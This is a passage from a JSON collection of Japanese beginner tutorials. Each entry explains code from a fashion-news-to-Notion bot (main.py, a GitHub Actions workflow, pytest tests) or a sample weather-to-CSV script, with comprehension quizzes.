[f\"# {title}\"]\n    for cat, items in grouped.items():\n        if items:\n            lines.append(f\"\\n## {cat}\")\n            lines += [f\"- {a.title} ({a.source}) {a.url}\" for a in items]\n    return \"\\n\".join(lines)\n\n\ndef page_title(now: datetime) -> str:\n    \"\"\"JST の正午より前なら朝刊、それ以降は夕刊。\"\"\"\n    jst = now.astimezone(JST)\n    return f\"{jst.date().isoformat()} {'朝刊' if jst.hour < 12 else '夕刊'}\"\n\n\ndef run(dry_run: bool, force: bool, now: datetime | None = None) -> int:\n    now = now or datetime.now(timezone.utc)\n    today = now.astimezone(JST).date().isoformat()\n    title = page_title(now)\n\n    sources = yaml.safe_load((ROOT / \"config/sources.yaml\").read_text(encoding=\"utf-8\"))[\"sources\"]\n    config = yaml.safe_load((ROOT / \"config/categories.yaml\").read_text(encoding=\"utf-8\"))\n    seen_path = ROOT / \"data/seen_urls.json\"\n    seen = load_seen(seen_path)\n\n    client = parent_id = None\n    if not dry_run:\n        token = (os.environ.get(\"NOTION_TOKEN\") or \"\").strip()\n        parent_id = (os.environ.get(\"NOTION_PARENT_PAGE_ID\") or \"\").strip()\n        if not token or not parent_id:\n            log.error(\"NOTION_TOKEN と NOTION_PARENT_PAGE_ID が必要です\")\n            return 1\n        if not token.isascii() or not token.isprintable() or \" \" in token:\n            log.error(\n                \"NOTION_TOKEN に半角英数字以外の文字（日本語・記号・空白・改行など）が含まれています。\"\n                \"Notion のインテグレーション画面のコピーアイコンでトークンをコピーし直して登録してください\"\n            )\n            return 1\n        client = NotionClient(token)\n        if not force and client.find_child_page(parent_id, title):\n            log.info(\"%s は作成済みのため終了します（--force で再作成）\", title)\n            return 0\n\n    fetched = fetch_all(sources)\n    if not fetched:\n        log.error(\"全ての情報源の取得に失敗しました\")\n        return 1\n    candidates = apply_source_filters(filter_recent(fetched, now), sources, config)\n    grouped = group_articles(dedupe(candidates, set(seen)), config)\n    articles = [a for items in grouped.values() for a in items]  # 上限で落とした記事は履歴に入れない\n    log.info(\"取得 %d件 → 掲載 %d件\", len(fetched), len(articles))\n\n    if dry_run:\n        print(render_text(title, grouped))\n        return 0\n\n    blocks = build_blocks(grouped) or [\n        {\n            \"type\": \"paragraph\",\n            \"paragraph\": {\"rich_text\": [{\"type\": \"text\", \"text\": {\"content\": \"本日の新着記事はありませんでした。\"}}]},\n        }\n    ]\n    url = client.create_daily_page(parent_id, title, blocks)\n    log.info(\"Notion に作成しました: %s\", url)\n\n    seen.update({normalize_url(a.url): today for a in articles})\n    seen_path.write_text(\n        json.dumps(prune_seen(seen, today), ensure_ascii=False, indent=0, sort_keys=True) + \"\\n\",\n        encoding=\"utf-8\",\n    )\n    return 0\n\n\ndef main() -> None:\n    ap = argparse.ArgumentParser(description=\"毎朝のファッションニュースを Notion に作成する\")\n    ap.add_argument(\"--dry-run\", action=\"store_true\", help=\"Notion に書かず標準出力に表示\")\n    ap.add_argument(\"--force\", action=\"store_true\", help=\"同じ日のページがあっても作成する\")\n    args = ap.parse_args()\n    logging.basicConfig(level=logging.INFO, format=\"%(levelname)s %(message)s\")\n    raise SystemExit(run(args.dry_run, args.force))\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n## 🧭 ひとことで言うと\n\n**Python** で書かれた、このプログラムの **司令塔** です。自分ではあまり細かい作業をせず、ここまでに読んだ部品（fetch・classify・dedupe・notion）を **正しい順番で呼び出す** ことが主な仕事です。130 行ほどありますが、一番大事なのは `run` 関数です。\n\n## 🗺️ 全体の流れ\n\n`main()` → `run()` の順に動きます。`run` の中身はこうです。\n\n1. **準備**：今の日時から「2026-11-16 朝刊」のようなタイトルを決め、設定ファイル 2 つと掲載履歴を読む\n2. **確認**：Notion のトークンがあるか・おかしな文字が混ざっていないかを確かめ、同じタイトルのページが既にあれば終わる\n3. **集める**：`fetch_all` で全サイトの記事を取る（全滅ならエラー終了）\n4. **ふるう**：古い記事・ファッションと関係ない記事・重複・掲載済みを除く\n5. **仕分ける**：`group_articles` でジャンル分けし、新しい順に各 20 件まで\n6. **届ける**：Notion にページを作る（記事 0 件なら「新着はありませんでした」と書く）\n7. **記録する**：載せた記事の URL を履歴に追加し、30 日より古い履歴を消して保存\n\n## 🔍 ブロックごとの解説\n\n### 定数：プログラム全体で使う決まった値\n\n```python\nJST = timezone(timedelta(hours=9))\nROOT = Path(__file__).resolve().parents[2]\n```\n\n- `JST`：日本時間（UTC＋9 時間）\n- `ROOT`：このファイル（`src/fashion_news/main.py`）から 2 つ上のフォルダ＝リポジトリの一番上。ここを基準に `config/` や `data/` を探すので、どこから実行しても同じファイルを読める\n\n### page_title：朝刊か夕刊か\n\n```python\njst = now.astimezone(JST)\nreturn f\"{jst.date().isoformat()} {'朝刊' if jst.hour < 12 else '夕刊'}\"\n```\n\nサーバーの時計は UTC なので、**日本時間に直してから** 日付と時刻を判断しています。日本時間 6:30 は UTC では前日の 21:30 なので、直さないと日付が 1 日ずれます。\n\n### 安全チェック：トークンのコピーミスを見つける\n\n```python\nif not token.isascii() or not token.isprintable() or \" \" in token:\n```\n\nトークンに日本語や空白・改行が混ざっていないか確かめています。GitHub の Secrets に貼り付けるときのコピーミスを、分かりやすいメッセージで知らせるための工夫です。\n\n### パイプラインの本体（3 行）\n\n```python\ncandidates = apply_source_filters(filter_recent(fetched, now), sources, config)\ngrouped = group_articles(dedupe(candidates, set(seen)), config)\narticles = [a for items in grouped.values() for a in items]\n```\n\n関数の中に関数を入れているので、**内側から読む** のがコツです。\n\n1. `filter_recent(fetched, now)`：新しい記事だけ\n2. `apply_source_filters(...)`：ファッションと関係ない記事を除く\n3. `dedupe(candidates, set(seen))`：重複・掲載済みを除く\n4. `group_articles(...)`：ジャンル分けして各 20 件まで\n5. 最後の行：ジャンル別に分かれた記事を 1 本のリストに戻す（二重の内包表記）\n\n### group_articles：仕分けと並べ替え\n\n```python\nitems.sort(key=lambda a: a.published or oldest, reverse=True)\n```\n\n公開日時の新しい順に並べます。日時が無い記事は「一番古い日時」として扱い、一番後ろへ。そのあと `items[:limit]` で上位 20 件だけ残します。\n\n### 履歴の保存\n\n```python\nseen.update({normalize_url(a.url): today for a in articles})\nseen_path.write_text(json.dumps(prune_seen(seen, today), ensure_ascii=False, ...))\n```\n\n- 載せた記事の URL と今日の日付を、辞書に追加する\n- `prune_seen`：30 日より前の記録を消す（ファイルが大きくなりすぎないように）\n- JSON にしてファイルに書き戻す。このあと GitHub Actions がコミットして保存する（9 ページ目）\n- **上限の 20 件からあふれた記事は履歴に入れない**ので、次の回に載るチャンスが残る\n\n### main：コマンドの受け付け口\n\n```python\nap.add_argument(\"--dry-run\", action=\"store_true\", ...)\nraise SystemExit(run(args.dry_run, args.force))\n```\n\n- `argparse`：`python -m fashion_news --dry-run` のような **コマンドのオプション** を読み取る標準ライブラリ\n- `--dry-run`：Notion に書かず、結果を画面に表示するだけ（試し運転）\n- `--force`：同じタイトルのページがあっても作る\n- `run` は成功なら `0`、失敗なら `1` を返し、`SystemExit` でそれを **終了コード** として外に伝える。GitHub Actions は 1 を見て「失敗」と判断し、メールで知らせてくれる\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `now = now or datetime.now(...)` | 引数で日時が渡されなければ今の日時。**テストで日時を固定できる** ようにする工夫 |\n| `client = parent_id = None` | 2 つの変数をまとめて None にする |\n| `build_blocks(grouped) or [...]` | 空のリストなら代わりに「新着なし」のブロックを使う |\n| `[a for items in ... for a in items]` | 二重のループの内包表記。左の for が外側 |\n| `return 1` / `return 0` | 終了コード。0 が成功、それ以外が失敗という OS の慣習 |\n\n## 🔑 キーワード\n\n- **司令塔（オーケストレーション）**：部品を順番に呼び出して全体を動かす役\n- **argparse**：コマンドラインのオプションを読み取る標準ライブラリ\n- **環境変数**：プログラムの外から渡す設定値（ここではトークン）\n- **タイムゾーン**：UTC と JST（日本時間）のような時差の扱い\n- **終了コード**：プログラムが成功（0）か失敗（1 など）かを外に伝える番号\n- **ドライラン**：本番の書き込みをしない試し運転\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 部品の呼び出し順が `run` にまとまっていて、全体の流れが追いやすい\n- ✅ トークンが無い・壊れている場合に、分かりやすいメッセージで止まる\n- ✅ 時刻を引数で渡せるので、テストで「朝刊／夕刊」の切り替えを確かめられる\n- ✅ 記事が 0 件でもページを作る（要件どおり）\n- ⚠️ `run` が「設定の読み込み」から「保存」まで多くの役割を持っていて長め。今は読める長さだが、機能を足すなら分けたい\n- ⚠️ 設定ファイルの書き間違い（`sources` キーが無いなど）は、分かりにくいエラー（KeyError）で止まる\n\n## 🗣️ 30 秒で人に説明するなら\n\n「main.py は全体の司令塔です。日本時間でページのタイトルを決めて、設定と掲載履歴を読み、Notion のトークンを確認してから、記事を集める、古いものと重複を除く、ジャンル分けして 20 件ずつにする、Notion にページを作る、という順に部品を呼びます。\n最後に載せた URL を履歴ファイルに保存して、次の回に同じ記事が出ないようにしています。--dry-run を付ければ Notion に書かずに試せます。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "日本時間 2026-11-14 の 6:30 に実行したとき、ページのタイトルは？",
      "choices": [
       "2026-11-13 夕刊",
       "2026-11-14 朝刊",
       "2026-11-13 朝刊"
      ],
      "answer": 1,
      "explain": "UTC では 11/13 21:30 ですが、日本時間に直してから判断するので 11/14 の朝刊です。"
     },
     {
      "question": "`--dry-run` を付けて実行すると？",
      "choices": [
       "Notion には書かず、結果を画面に表示する",
       "Notion のページを削除する",
       "履歴ファイルだけ更新する"
      ],
      "answer": 0,
      "explain": "dry_run のときは表示して return 0 で終わり、履歴も書き換えません。"
     },
     {
      "question": "ジャンルの上限 20 件からあふれた記事はどうなる？",
      "choices": [
       "履歴に入り、二度と載らない",
       "履歴に入らないので、次の回に載る可能性がある",
       "「その他」に移される"
      ],
      "answer": 1,
      "explain": "コメントの「上限で落とした記事は履歴に入れない」がその意図です。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-08-main"
  },
  {
   "title": "daily.yml ― 毎日 2 回、自動で動かす GitHub Actions の設定",
   "language": "YAML",
   "date": "2026-11-16",
   "level": 2,
   "series": "fashion_news",
   "part": 9,
   "concepts": [
    "tooling",
    "version_control",
    "security",
    "data_formats"
   ],
   "lessons": [
    "100-ai-dev/04-git-basics",
    "100-ai-dev/06-secrets-env",
    "10-python/08-modules"
   ],
   "summary": "毎日 6:30 と 17:30（日本時間）に GitHub のサーバーでプログラムを動かし、掲載履歴をコミットする設定。",
   "body": "## 📄 解説するコード\n\n`.github/workflows/daily.yml`\n\n```yaml\nname: daily-fashion-news\n\non:\n  schedule:\n    - cron: \"30 21 * * *\" # 毎日 6:30 JST（朝刊）。混雑時の遅れを見込んで 7:00 の30分前\n    - cron: \"30 8 * * *\" # 毎日 17:30 JST（夕刊）。18:00 の30分前\n  workflow_dispatch:\n    inputs:\n      force:\n        description: \"同じ日のページがあっても作成する\"\n        type: boolean\n        default: false\n\npermissions:\n  contents: write # data/seen_urls.json をコミットするため\n\nconcurrency:\n  group: daily-fashion-news\n  cancel-in-progress: false\n\njobs:\n  run:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-python@v5\n        with:\n          python-version: \"3.12\"\n          cache: pip\n      - run: pip install -r requirements.txt\n      - name: Notion にページを作成\n        env:\n          NOTION_TOKEN: ${{ secrets.NOTION_TOKEN }}\n          NOTION_PARENT_PAGE_ID: ${{ secrets.NOTION_PARENT_PAGE_ID }}\n          PYTHONPATH: src\n        run: python -m fashion_news ${{ inputs.force && '--force' || '' }}\n      - name: 掲載済みURLの履歴をコミット\n        run: |\n          if [ -n \"$(git status --porcelain data/seen_urls.json)\" ]; then\n            git config user.name \"github-actions[bot]\"\n            git config user.email \"41898282+github-actions[bot]@users.noreply.github.com\"\n            git add data/seen_urls.json\n            git commit -m \"chore: 掲載済みURLの履歴を更新\"\n            git push\n          fi\n```\n\n## 🧭 ひとことで言うと\n\n**YAML** で書かれた **GitHub Actions の設定ファイル** です。「いつ」「どんなパソコンで」「どの順番で何を実行するか」を書いておくと、GitHub が自分のサーバーで代わりに動かしてくれます。このファイルのおかげで、あなたのパソコンが寝ていてもニュースが届きます。\n\n## 🗺️ 全体の流れ\n\n1. **きっかけ（on）**：毎日 6:30 と 17:30（日本時間）、または Actions の画面から手動で\n2. **準備**：GitHub が Ubuntu（Linux）のパソコンを 1 台用意する\n3. **手順（steps）**：\n   1. リポジトリのコードを取ってくる\n   2. Python 3.12 を入れる\n   3. 必要なライブラリを入れる\n   4. Secrets から Notion のトークンを受け取って、プログラムを実行する\n   5. 掲載履歴（`seen_urls.json`）が変わっていればコミットして GitHub に保存する\n4. 終わったらそのパソコンは捨てられる（だから履歴をファイルにして保存しておく必要がある）\n\n## 🔍 ブロックごとの解説\n\n### on：いつ動かすか\n\n```yaml\nschedule:\n  - cron: \"30 21 * * *\"\n```\n\n`cron` は「分 時 日 月 曜日」の順に時刻を書く書き方です。`*` は「毎」。\n**時刻は UTC（世界標準時）** なので、`30 21` は UTC の 21:30 ＝ 日本時間の翌朝 6:30 です（日本は 9 時間進んでいる）。\nGitHub は混雑すると数分〜数十分遅れることがあるので、7:00 に間に合うよう 30 分早めにしています。\n\n`workflow_dispatch` は「Actions の画面の Run workflow ボタンで手動実行できる」設定で、`force` というチェックボックスも付けています。\n\n### permissions と concurrency\n\n| 設定 | 意味 |\n|---|---|\n| `contents: write` | 履歴ファイルをコミットして push するために、書き込み権限をもらう |\n| `concurrency` | 同じ処理が 2 つ同時に動かないようにする。前の実行が終わるまで次は待つ（`cancel-in-progress: false`） |\n| `timeout-minutes: 10` | 10 分を超えたら打ち切る（固まったときの保険） |\n\n### steps：手順\n\n```yaml\n- uses: actions/checkout@v4\n- uses: actions/setup-python@v5\n```\n\n`uses:` は「誰かが作った便利な部品（アクション）を使う」。`@v4` はそのバージョンです。\n`run:` は「このコマンドを実行する」。\n\n```yaml\nenv:\n  NOTION_TOKEN: ${{ secrets.NOTION_TOKEN }}\n  PYTHONPATH: src\nrun: python -m fashion_news ${{ inputs.force && '--force' || '' }}\n```\n\n- `${{ secrets.NOTION_TOKEN }}`：リポジトリの Settings → Secrets に登録した値を、**環境変数** としてプログラムに渡す。ログには `***` と伏せて表示される\n- `${{ inputs.force && '--force' || '' }}`：手動実行で force にチェックしたときだけ `--force` を付ける（「条件 && A || B」で「条件なら A、でなければ B」）\n\n### 最後の step：履歴を保存する\n\n```bash\nif [ -n \"$(git status --porcelain data/seen_urls.json)\" ]; then\n  git add data/seen_urls.json\n  git commit -m \"chore: 掲載済みURLの履歴を更新\"\n  git push\nfi\n```\n\nこれは YAML の中に書かれた **シェル（Bash）のコマンド** です。\n\n- `git status --porcelain ファイル`：そのファイルが変わっていれば何か表示される\n- `[ -n \"...\" ]`：「文字が空でなければ」\n- 変わっていたときだけ、コミットして push する\n\nGitHub のコミット履歴に「chore: 掲載済みURLの履歴を更新」が毎日並んでいるのは、このステップのしわざです。\n\n## 🐍 Python と比べると\n\n| daily.yml | Python で言うと |\n|---|---|\n| `steps:` の並び | 上から順に実行される命令 |\n| `env:` | `os.environ[\"NOTION_TOKEN\"]` で読める値を用意しておく |\n| `if [ -n \"...\" ]; then ... fi` | `if 変更あり: ...` |\n| `${{ 条件 && 'A' \\|\\| 'B' }}` | `'A' if 条件 else 'B'` |\n\n## 🔑 キーワード\n\n- **GitHub Actions**：GitHub のサーバーでプログラムを自動実行する仕組み\n- **ワークフロー**：Actions で実行する一連の手順（このファイル 1 つ分）\n- **cron**：決まった時刻に実行するための時刻の書き方\n- **Secrets**：GitHub に保存する秘密の値。コードやログに出ない\n- **runner（ubuntu-latest）**：処理を実行するために GitHub が用意するパソコン\n- **アクション（uses）**：他の人が作った、再利用できる手順の部品\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ トークンを Secrets で渡していて、コードやリポジトリに書いていない\n- ✅ 同時実行の防止・タイムアウト・手動実行と、運用に必要なものがそろっている\n- ✅ 履歴ファイルに変更があるときだけコミットする\n- ⚠️ 実行中にあなたが同じブランチに別の変更を push していると、最後の `git push` が「先に進まれている」と失敗することがある（めったに起きない。次の回で取り戻せる）\n- ⚠️ GitHub は、**60 日間リポジトリに動きが無いと、スケジュール実行を自動で止める** ことがある。ただしこのワークフローは毎回コミットしているので、止まりにくい\n- ⚠️ 公開リポジトリなので、実行ログ（取得件数など）は誰でも見られる。Secrets の値は伏せられるので漏れない\n\n## 🗣️ 30 秒で人に説明するなら\n\n「daily.yml は GitHub Actions の設定です。cron で UTC の 21:30 と 8:30、つまり日本時間の 6:30 と 17:30 に、GitHub のサーバーで Python を準備してプログラムを動かします。\nNotion のトークンは Secrets から環境変数で渡していて、実行後に掲載履歴の JSON が変わっていれば、自動でコミットして保存します。手動実行用のボタンも付いています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`cron: \"30 8 * * *\"` は日本時間の何時？",
      "choices": [
       "8:30",
       "17:30",
       "23:30"
      ],
      "answer": 1,
      "explain": "cron の時刻は UTC です。日本時間は 9 時間足して 17:30 になります。"
     },
     {
      "question": "`${{ secrets.NOTION_TOKEN }}` の値はどこに保存されている？",
      "choices": [
       "daily.yml の中",
       "README.md の中",
       "GitHub のリポジトリ設定（Secrets）"
      ],
      "answer": 2,
      "explain": "コードには名前だけを書き、値は GitHub の Secrets に安全に保存します。"
     },
     {
      "question": "最後のステップで `seen_urls.json` をコミットする理由は？",
      "choices": [
       "実行用のパソコンは毎回捨てられるので、履歴を GitHub に残しておく必要があるから",
       "Notion に履歴を送るため",
       "テストを実行するため"
      ],
      "answer": 0,
      "explain": "保存しておかないと、次の回は「何を載せたか」を覚えていられません。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-09-workflow"
  },
  {
   "title": "test_pipeline.py ― 部品が正しく動くかを確かめるテスト",
   "language": "Python",
   "date": "2026-11-16",
   "level": 3,
   "series": "fashion_news",
   "part": 10,
   "concepts": [
    "testing",
    "functions",
    "modules"
   ],
   "lessons": [
    "100-ai-dev/08-testing",
    "10-python/05-functions",
    "10-python/08-modules"
   ],
   "summary": "11 個のテストで、RSS の読み取り・URL とタイトルの正規化・重複除去・ジャンル分けなどを確かめる。",
   "body": "## 📄 解説するコード\n\n`tests/conftest.py`\n\n```python\nimport sys\nfrom pathlib import Path\n\nsys.path.insert(0, str(Path(__file__).resolve().parents[1] / \"src\"))\n```\n\n`tests/test_pipeline.py`（抜粋）\n\n```python\nfrom datetime import datetime, timedelta, timezone\n\nimport yaml\n\nfrom fashion_news.classify import classify\nfrom fashion_news.dedupe import dedupe, filter_recent, normalize_title, normalize_url\nfrom fashion_news.fetch import parse_feed\nfrom fashion_news.main import group_articles, prune_seen, render_text\nfrom fashion_news.models import Article\nfrom fashion_news.notion import build_blocks\n\nRSS = \"\"\"<?xml version=\"1.0\"?><rss version=\"2.0\"><channel><title>t</title>\n<item><title>パリコレクション開幕</title><link>https://ex.com/a?utm_source=x</link>\n<pubDate>Fri, 13 Nov 2026 20:00:00 +0000</pubDate></item>\n<item><title></title><link>https://ex.com/empty</link></item>\n</channel></rss>\"\"\"\n\nCONFIG = yaml.safe_load(open(\"config/categories.yaml\", encoding=\"utf-8\"))\nNOW = datetime(2026, 11, 13, 21, 0, tzinfo=timezone.utc)\n\n\ndef art(title, url=\"https://ex.com/1\", kind=\"media\", pub=None):\n    return Article(title, url, \"src\", kind, pub)\n\n\ndef test_parse_feed_skips_empty_title_and_parses_date():\n    items = parse_feed(RSS, \"ex\", \"media\")\n    assert len(items) == 1\n    assert items[0].published == datetime(2026, 11, 13, 20, 0, tzinfo=timezone.utc)\n\n\ndef test_normalize_url_strips_tracking_and_fragment():\n    assert normalize_url(\"https://EX.com/a/?utm_source=x&id=1#top\") == \"https://ex.com/a?id=1\"\n\n\ndef test_dedupe_by_url_title_and_seen():\n    items = [\n        art(\"新作スニーカーが発売\", \"https://ex.com/1\"),\n        art(\"新作スニーカーが発売 - 別媒体\", \"https://other.com/2\"),\n        art(\"別の話題\", \"https://ex.com/3\"),\n        art(\"掲載済み\", \"https://ex.com/4\"),\n    ]\n    out = dedupe(items, {\"https://ex.com/4\"})\n    assert [a.title for a in out] == [\"新作スニーカーが発売\", \"別の話題\"]\n\n\ndef test_classify_priority_and_fallback():\n    assert classify(art(\"ミラノでコレクション発表\"), CONFIG) == \"ハイブランド/コレクション\"\n    assert classify(art(\"ナイキ新作スニーカー\"), CONFIG) == \"ストリート/スニーカー\"\n    assert classify(art(\"決算を発表\"), CONFIG) == \"業界・ビジネス\"\n    assert classify(art(\"何でもない記事\"), CONFIG) == \"その他\"\n    assert classify(art(\"ナイキ新作\", kind=\"official\"), CONFIG) == \"公式発表・ニッチ\"\n\n\ndef test_page_title_morning_and_evening():\n    from fashion_news.main import page_title\n\n    assert page_title(datetime(2026, 11, 13, 21, 45, tzinfo=timezone.utc)) == \"2026-11-14 朝刊\"\n    assert page_title(datetime(2026, 11, 14, 8, 45, tzinfo=timezone.utc)) == \"2026-11-14 夕刊\"\n```\n\n（実際のファイルにはこのほか、タイトルの正規化・古い記事の除外・Notion ブロックの組み立て・履歴の整理・20 件の上限・ファッション記事への絞り込みのテストがあり、全部で 11 個です）\n\n## 🧭 ひとことで言うと\n\n**Python**（pytest）で書かれた **テストコード** です。「この入力を渡したら、この結果になるはず」を 11 個書いておき、部品が期待どおり動くかを自動で確かめます。インターネットや Notion には一切つながず、手元だけで確かめられるように作られています。\n\n## 🗺️ 全体の流れ\n\n1. `PYTHONPATH=src python -m pytest` を実行する\n2. pytest が `tests/` の中の `test_` で始まる関数を全部見つけて、1 つずつ実行する\n3. 各テストの中の `assert` がすべて成り立てば「passed（成功）」、1 つでも違えば「failed（失敗）」\n4. `conftest.py` は、テストの前に自動で読まれる準備用のファイル\n\n## 🔍 ブロックごとの解説\n\n### conftest.py：import できるようにする準備\n\n```python\nsys.path.insert(0, str(Path(__file__).resolve().parents[1] / \"src\"))\n```\n\n`sys.path` は「Python がモジュールを探しに行く場所のリスト」です。その先頭に `src` フォルダを足すことで、テストから `import fashion_news...` と書けるようにしています。\n\n### 本物の代わりに「見本のデータ」を使う\n\n```python\nRSS = \"\"\"<?xml version=\"1.0\"?><rss ...>\n<item><title>パリコレクション開幕</title>...</item>\n<item><title></title><link>https://ex.com/empty</link></item>\n</channel></rss>\"\"\"\n```\n\n本物のサイトから RSS を取ってくると、ネットの状態や記事の中身でテスト結果が変わってしまいます。\nそこで **小さな見本の RSS を文字列で用意** し、`parse_feed` に直接渡しています。2 件目はわざとタイトルを空にしていて、「空のタイトルは飛ばす」ことを確かめています。\n\n```python\nNOW = datetime(2026, 11, 13, 21, 0, tzinfo=timezone.utc)\n```\n\n「今」も固定しています。`datetime.now()` を使うと、実行する日によって結果が変わるからです。`main.py` の `run` が `now` を引数で受け取れるように作られていたのは、このためでもあります。\n\n### art：テスト用の記事を手早く作る関数\n\n```python\ndef art(title, url=\"https://ex.com/1\", kind=\"media\", pub=None):\n    return Article(title, url, \"src\", kind, pub)\n```\n\n毎回 `Article(...)` に 5 つの値を書くのは大変なので、タイトルだけ渡せば作れる小さな関数を用意しています。\n\n### テストを 1 つ読んでみる\n\n```python\ndef test_dedupe_by_url_title_and_seen():\n    items = [\n        art(\"新作スニーカーが発売\", \"https://ex.com/1\"),\n        art(\"新作スニーカーが発売 - 別媒体\", \"https://other.com/2\"),\n        art(\"別の話題\", \"https://ex.com/3\"),\n        art(\"掲載済み\", \"https://ex.com/4\"),\n    ]\n    out = dedupe(items, {\"https://ex.com/4\"})\n    assert [a.title for a in out] == [\"新作スニーカーが発売\", \"別の話題\"]\n```\n\n| 記事 | 残る？ | 理由 |\n|---|---|---|\n| 新作スニーカーが発売 | ⭕ | 最初の記事 |\n| 新作スニーカーが発売 - 別媒体 | ❌ | 末尾の媒体名を取ると 1 つ目と同じタイトル |\n| 別の話題 | ⭕ | 新しい話題 |\n| 掲載済み | ❌ | URL が掲載済みの一覧に入っている |\n\nテストの名前（`by_url_title_and_seen`）と `assert` を読むだけで、**dedupe が何をするはずの関数か** が分かります。テストは「動く仕様書」でもあるのです。\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `assert 式 == 期待値` | 成り立たなければテスト失敗。pytest は違いを分かりやすく表示してくれる |\n| `\"\"\"...\"\"\"` | 複数行の文字列。見本の RSS をそのまま書くのに便利 |\n| 関数の中の `from ... import` | そのテストだけで使う import。動きは同じ |\n| `dict(CONFIG, max_per_category=2)` | CONFIG をコピーして 1 か所だけ変えた辞書を作る（元の CONFIG は変えない） |\n\n## 🔑 キーワード\n\n- **pytest**：Python で最もよく使われるテストのためのツール\n- **assert**：「この条件が成り立つはず」という確認\n- **テストデータ（フィクスチャ）**：テストのために用意した見本のデータ\n- **conftest.py**：pytest がテストの前に自動で読む準備用のファイル\n- **sys.path**：Python がモジュールを探す場所の一覧\n- **単体テスト**：部品（関数）ごとに動きを確かめるテスト\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ ネットや Notion につながずに確かめられるので、速く、何度でも同じ結果になる\n- ✅ 日時を固定していて、実行日に左右されない\n- ✅ 境界になる場合（空のタイトル、日付なし、上限ちょうど）を確かめている\n- ⚠️ `notion.py` の通信部分（リトライなど）や `fetch_all`（失敗しても続ける）はテストされていない。通信を「偽物」に差し替える仕組み（モック）を使えばテストできる\n- ⚠️ `open(\"config/categories.yaml\")` はリポジトリの一番上から実行する前提。別の場所から pytest を実行するとファイルが見つからない\n- ⚠️ GitHub Actions ではテストを実行していない（`daily.yml` は本番実行だけ）。push のたびにテストを自動で動かす設定を足すと安心\n\n## 🗣️ 30 秒で人に説明するなら\n\n「tests フォルダには pytest のテストが 11 個あります。見本の RSS や固定した日時を使って、ネットや Notion につながずに、RSS の読み取り、URL とタイトルの正規化、重複の除去、ジャンル分け、朝刊・夕刊の判定などが期待どおりかを assert で確かめています。\nAI に修正を頼んだあとにこれを実行すれば、前の機能を壊していないかすぐに分かります。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "テストで本物のサイトから RSS を取らず、見本の文字列を使う理由は？",
      "choices": [
       "本物の RSS は Python で読めないから",
       "ネットの状態や記事の中身に左右されず、毎回同じ結果で確かめられるから",
       "テストを長くするため"
      ],
      "answer": 1,
      "explain": "テストは何度実行しても同じ結果になることが大切です。"
     },
     {
      "question": "`assert len(items) == 1` が失敗するのはどんなとき？",
      "choices": [
       "items の数が 1 以外のとき",
       "items の数が 1 のとき",
       "items が空のときだけ"
      ],
      "answer": 0,
      "explain": "assert の条件が成り立たないと失敗になります。"
     },
     {
      "question": "`NOW = datetime(2026, 11, 13, 21, 0, ...)` のように「今」を固定している理由は？",
      "choices": [
       "2026 年に実行するため",
       "実行する日によって結果が変わらないようにするため",
       "時刻の計算を速くするため"
      ],
      "answer": 1,
      "explain": "datetime.now() を使うと、日によってテストが通ったり通らなかったりしてしまいます。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-10-tests"
  },
  {
   "title": "天気予報を取得して CSV に保存するスクリプト",
   "language": "Python",
   "date": "2026-11-16",
   "level": 3,
   "concepts": [
    "http_api",
    "data_formats",
    "io",
    "errors",
    "functions",
    "modules"
   ],
   "lessons": [
    "10-python/05-functions",
    "10-python/07-exceptions",
    "10-python/08-modules",
    "10-python/11-files-and-json",
    "10-python/12-type-hints-dataclass"
   ],
   "summary": "無料の天気 API から 1 週間分の気温を取り、CSV ファイルに書き出す。",
   "body": "> 📝 これはサンプルです。Claude にコードを貼ると、このような解説ページが追加されます。\n\n## 📄 解説するコード\n\n```python\nimport csv\nimport sys\nfrom pathlib import Path\n\nimport requests\n\nAPI_URL = \"https://api.open-meteo.com/v1/forecast\"\n\n\ndef fetch_forecast(lat: float, lon: float) -> dict:\n    params = {\n        \"latitude\": lat,\n        \"longitude\": lon,\n        \"daily\": \"temperature_2m_max,temperature_2m_min\",\n        \"timezone\": \"Asia/Tokyo\",\n    }\n    response = requests.get(API_URL, params=params, timeout=10)\n    response.raise_for_status()\n    return response.json()\n\n\ndef save_csv(data: dict, path: Path) -> int:\n    daily = data[\"daily\"]\n    rows = zip(daily[\"time\"], daily[\"temperature_2m_max\"], daily[\"temperature_2m_min\"])\n    with path.open(\"w\", newline=\"\", encoding=\"utf-8\") as f:\n        writer = csv.writer(f)\n        writer.writerow([\"date\", \"max\", \"min\"])\n        count = 0\n        for row in rows:\n            writer.writerow(row)\n            count += 1\n    return count\n\n\ndef main() -> None:\n    try:\n        data = fetch_forecast(35.68, 139.76)\n    except requests.RequestException as e:\n        print(f\"取得に失敗しました: {e}\", file=sys.stderr)\n        sys.exit(1)\n    n = save_csv(data, Path(\"forecast.csv\"))\n    print(f\"{n} 日分を保存しました\")\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n## 🧭 ひとことで言うと\n\n**Python** で書かれた、東京の 1 週間の最高・最低気温をインターネットから取得し、`forecast.csv` に保存するスクリプトです。\n\n## 🗺️ 全体の流れ\n\n1. 一番下の `if __name__ == \"__main__\":` から `main()` が呼ばれる（入口）\n2. `fetch_forecast` が天気 API にアクセスし、JSON を辞書として受け取る（**入力**）\n3. `save_csv` が辞書から日付・最高・最低気温を取り出し、CSV に 1 行ずつ書く（**処理**）\n4. 何日分保存したかを表示する（**出力**）。通信に失敗したらメッセージを出して終了\n\n## 🔍 ブロックごとの解説\n\n### import と定数\n\n```python\nimport 